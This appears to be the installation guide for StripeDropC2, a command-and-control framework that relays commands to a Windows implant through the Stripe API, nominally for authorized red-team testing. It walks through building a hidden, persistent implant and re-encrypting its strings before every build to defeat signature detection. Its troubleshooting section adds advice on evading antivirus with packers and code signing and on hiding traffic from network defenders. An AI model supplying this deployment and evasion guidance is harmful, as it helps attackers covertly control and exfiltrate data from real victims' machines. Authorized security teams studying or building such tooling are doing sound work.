# Installation Guide

Complete step-by-step instructions for setting up StripeDropC2 for authorized security testing.

## Prerequisites

### Operator (C2 Server)

**Required:**
- Python 3.8 or higher
- pip (Python package manager)
- Internet access to Stripe API
- Stripe account (free test mode)

**Recommended:**
- Linux/macOS for operator (Windows works but less tested)
- tmux or screen for persistent sessions
- VPN or proxy for operational security

**System Requirements:**
- CPU: Any modern processor
- RAM: 512 MB minimum
- Disk: 100 MB for operator + storage for screenshots/downloads
- Network: Stable internet connection

### Target System (Implant)

**Required:**
- Windows 10/11 (x64)
- .NET 10.0 SDK for building
- OR .NET 10.0 Runtime if using pre-built binaries

**Build System Requirements:**
- CPU: Any x64 processor
- RAM: 2 GB minimum for compilation
- Disk: 500 MB for SDK + build outputs

## Setup Instructions

### Part 1: Stripe Account Configuration

1. **Create Stripe Account**
```
Go to: https://stripe.com/
Sign up for free account (no credit card required for test mode)
Verify email address
```

2. **Access Test Mode API Keys**
```
Navigate to: https://dashboard.stripe.com/test/apikeys
Click "Create secret key" or use existing test key
Copy the key starting with: sk_test_...
```

**IMPORTANT**: Always use TEST mode keys, never live mode
- Test mode: `sk_test_...` (safe for C2, no financial impact)
- Live mode: `sk_live_...` (creates audit trail, DO NOT USE)

3. **Optional: Set Up Webhooks (for advanced monitoring)**
```
Navigate to: https://dashboard.stripe.com/test/webhooks
Add endpoint URL (if you have a webhook receiver)
Subscribe to: customer.created, customer.updated, customer.deleted
```

### Part 2: Operator Setup

1. **Clone Repository**
```bash
git clone https://github.com/infosecninja/StripeDropC2.git
cd StripeDropC2
```

2. **Install Python Dependencies**
```bash
# Create virtual environment (recommended)
python3 -m venv venv
source venv/bin/activate # On Windows: venv\Scripts\activate

# Install Stripe SDK
pip install stripe
```

Verify installation:
```bash
python3 -c "import stripe; print(stripe.__version__)"
# Should output: 11.x.x or higher
```

3. **Configure API Key**

**Option A: Create config file (recommended)**
```bash
cat > c2_config.py << 'EOF'
API_KEY = "sk_test_YOUR_KEY_HERE"
EOF
```

**Option B: Copy template**
```bash
cp c2_config.py.example c2_config.py
# Edit with your favorite editor
nano c2_config.py
```

Replace `sk_test_YOUR_KEY_HERE` with your actual Stripe test key.

4. **Verify Operator Works**
```bash
python3 c2_operator.py
```

You should see:
```
[no implant] > 
```

Type `help` to see commands. Type `exit` to quit.

### Part 3: Implant Build Setup

1. **Install .NET SDK**

**Windows:**
```powershell
# Download from: https://dotnet.microsoft.com/download/dotnet/10.0
# Or use winget:
winget install Microsoft.DotNet.SDK.10
```

**Linux/macOS:**
```bash
# Follow instructions at: https://dotnet.microsoft.com/download/dotnet/10.0
# Or use package manager:

# Ubuntu/Debian
wget https://packages.microsoft.com/config/ubuntu/22.04/packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo apt-get update
sudo apt-get install -y dotnet-sdk-10.0

# macOS
brew install dotnet@10
```

Verify installation:
```bash
dotnet --version
# Should output: 10.x.x
```

2. **Regenerate Encryption Key**

**CRITICAL SECURITY STEP - DO NOT SKIP!**

**You MUST run this before EVERY build!**

```bash
python3 regenerate_key.py
```

**Why this is critical:**
- Generates a new random 16-byte XOR key
- Re-encrypts all 18 strings in Implant.cs
- Changes the binary signature on every compile
- Prevents static analysis from extracting strings
- Makes each build unique (defeats hash-based detection)

**Failure to run this means:**
- Your implant has predictable, extractable strings
- Antivirus will detect identical signatures
- Static analysis can read your Stripe API key
- Multiple builds are identical (bad OpSec)

You should see:
```
[*] Generated new XOR key: 0xXX, 0xXX, ...
[+] Regenerated encryption for 18 strings
[+] Implant.cs updated successfully

Now rebuild with:
dotnet publish Implant.csproj -c Release -r win-x64 -p:DefineConstants=HIDE_CONSOLE
```

3. **Choose Your Build Profile**

Select based on your operational needs:

| Use Case | Profile | Detection Risk | Response Time |
|----------|---------|----------------|---------------|
| Quick testing / lab | LOW | Very High | Instant (2-5s) |
| Red team engagement | BALANCED | Moderate | Fast (5-15s) |
| High-security target | HIGH | Low | Slow (30-60s) |
| Maximum stealth | PARANOID | Very Low | Very Slow (2-5min) |

4. **Build the Implant**

**Quick Test Build** (visible console, fast polling):
```bash
dotnet publish Implant.csproj -c Release -r win-x64 \
-p:DefineConstants="STEALTH_LOW"
```

**Production Build** (recommended - hidden, persistent, balanced):
```bash
dotnet publish Implant.csproj -c Release -r win-x64 \
-p:DefineConstants="STEALTH_BALANCED;HIDE_CONSOLE;PERSIST_REGISTRY;ALLOW_DYNAMIC_CONFIG"
```

**Maximum Stealth Build** (for high-security targets):
```bash
dotnet publish Implant.csproj -c Release -r win-x64 \
-p:DefineConstants="STEALTH_PARANOID;HIDE_CONSOLE;PERSIST_TASK;PERSIST_REGISTRY;ALLOW_DYNAMIC_CONFIG"
```

Build output location:
```
bin/Release/net10.0/win-x64/publish/stripe.exe
```

The binary will be ~15-25 MB (single-file, self-contained, trimmed).

### Part 4: Testing Setup

1. **Test in Isolated Environment**

**Never test on production systems or without authorization**

**Option A: Local Windows VM**
```
- Use VMware, VirtualBox, or Hyper-V
- Windows 10/11 VM with network access
- Snapshot before testing for easy rollback
```

**Option B: Sandboxed Cloud Instance**
```
- Azure/AWS Windows instance with isolated network
- Restricted security groups
- Ephemeral instance (terminate after testing)
```

2. **Deploy Test Implant**

```bash
# Copy to test system
scp bin/Release/net10.0/win-x64/publish/stripe.exe user@testvm:

# Or via shared folder in VM
```

3. **Run Test Implant**

On test Windows system:
```powershell
# For test builds (visible console)
.\stripe.exe

# For production builds (hidden console) - check Task Manager
Start-Process .\stripe.exe -WindowStyle Hidden
```

4. **Verify C2 Connection**

In operator console:
```bash
python3 c2_operator.py
```

Wait 15-30 seconds for initial heartbeat, then:
```
[no implant] > implants
```

You should see your test system listed with:
- Implant ID (hostname + hash)
- OS information
- Last seen timestamp
- Status (ACTIVE)

5. **Test Basic Commands**

```bash
use <implant_id> # Select your test implant
whoami # Should return test system username
hostname # Should return test system name
ipconfig # Should return network config
```

## Troubleshooting

### Operator Issues

**Problem: "No module named 'stripe'"**
```bash
Solution: pip install stripe
```

**Problem: "stripe.error.AuthenticationError: Invalid API Key"**
```
Solution: 
1. Verify you're using a test mode key (sk_test_...)
2. Check for typos in c2_config.py
3. Ensure no extra spaces/quotes around key
4. Regenerate key from Stripe dashboard
```

**Problem: "No active implants"**
```
Solution:
1. Verify implant is running on target (check Task Manager)
2. Wait 30-60 seconds for initial heartbeat
3. Check target has internet access to api.stripe.com
4. Verify firewall allows HTTPS outbound
5. Check Stripe dashboard for Customer objects
```

### Implant Build Issues

**Problem: ".NET SDK not found"**
```bash
Solution: 
dotnet --version
# If not installed, download from microsoft.com/dotnet
```

**Problem: "Implant.cs has compilation errors"**
```
Solution:
1. Ensure you ran: python3 regenerate_key.py
2. Check for incomplete regeneration
3. Verify all encrypted strings are present
4. Restore from git if corrupted
```

**Problem: "Implant.exe is 200+ MB"**
```
Solution:
1. Ensure using: -c Release (not Debug)
2. Check PublishTrimmed is true in .csproj
3. Verify SelfContained publishing is working
4. Try clean build: dotnet clean; dotnet publish...
```

### Runtime Issues

**Problem: "Implant doesn't connect"**
```
Checklist:
Implant has network access to api.stripe.com
No proxy blocking Stripe API calls
Correct API key in both operator and implant
Ran regenerate_key.py before building
Windows Defender or AV not blocking
Firewall allows outbound HTTPS
```

**Problem: "Commands timeout"**
```
Solution:
1. Check stealth profile - PARANOID is very slow
2. Increase timeout with: config preset balanced
3. Verify target system isn't suspended/sleeping
4. Check Stripe rate limiting (too many requests)
```

**Problem: "Rate limit errors"**
```
Solution:
1. Slow down polling: config preset high
2. Clear stale objects: clear
3. Test mode allows ~100 req/sec
4. Add delays between operator commands
```

### Security Issues

**Problem: "Implant detected by AV"**
```
Solutions:
1. Regenerate XOR key (changes binary signature)
2. Use code signing certificate
3. Adjust stealth profile to slower timing
4. Test with AV disabled first to isolate issue
5. Consider adding runtime packers (UPX)
```

**Problem: "Network team flagged Stripe traffic"**
```
Solutions:
1. Switch to slower profile (HIGH or PARANOID)
2. Add jitter to timing (already built-in)
3. Blend with legitimate Stripe usage if possible
4. Consider alternative C2 channel if Stripe blocked
```

## Verification Tests

After installation, run these tests:

### Test 1: Operator Connectivity
```bash
python3 c2_operator.py
[no implant] > exit
# Should exit cleanly
```

### Test 2: Stripe API Access
```python
python3 << 'EOF'
import stripe
import c2_config
stripe.api_key = c2_config.API_KEY
c = stripe.Customer.create(name="test")
print(f" Stripe API working: {c.id}")
stripe.Customer.delete(c.id)
print(" Cleanup successful")
EOF
```

### Test 3: Implant Build
```bash
python3 regenerate_key.py
dotnet build Implant.csproj -c Release
# Should complete with 0 errors
```

### Test 4: End-to-End
```bash
# Terminal 1: Start operator
python3 c2_operator.py

# Terminal 2: Run implant on test VM
.\stripe.exe

# Terminal 1: Wait 30s, then
implants
use <id>
whoami
```

## Next Steps

After successful installation:

1. Read [SECURITY.md](SECURITY.md) for OpSec guidelines
2. Review [README.md](README.md) for full command reference
3. Practice in isolated lab environment
4. Document your infrastructure setup
5. Prepare incident response procedures
6. Plan data exfiltration handling
7. Schedule regular key rotation

## Getting Help

If you encounter issues not covered here:

1. Check [GitHub Issues](https://github.com/infosecninja/StripeDropC2/issues)
2. Review Stripe API documentation
3. Verify .NET SDK compatibility
4. Test in minimal environment (clean VM)
5. Open new issue with:
- Operating system details
- Error messages (full output)
- Steps to reproduce
- Configuration (sanitized)

---

**Installation complete! Remember to use responsibly and legally.**
